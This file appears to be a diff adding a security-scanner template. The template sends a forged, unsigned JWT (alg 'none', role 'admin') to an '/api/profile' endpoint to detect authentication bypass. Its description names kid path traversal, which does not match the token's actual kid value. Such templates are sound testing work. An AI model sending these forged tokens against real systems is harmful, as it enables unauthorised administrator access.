@@ -1,0 +1,23 @@
+id: patt-jwt-kid-01-nxp0140
+name: 'PATT JWT none kid k-nxp0140'
+severity: critical
+type: active
+tags:
+  - jwt
+  - patt
+  - auth
+  - none
+description: 'PATT JWT kid path traversal (verifikasi manual with jwt_tool -X). [patt:patt-jwt-kid-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/JSON%20Web%20Token/README.md] [teknik:PATT-JWT-KID kid=../../dev/null role=admin]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}/api/profile'
+    match-all: true
+    sendHeaders:
+      Authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiay1ueHAwMTQwIn0.eyJzdWIiOiJwYXR0Iiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.'
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - 'admin'
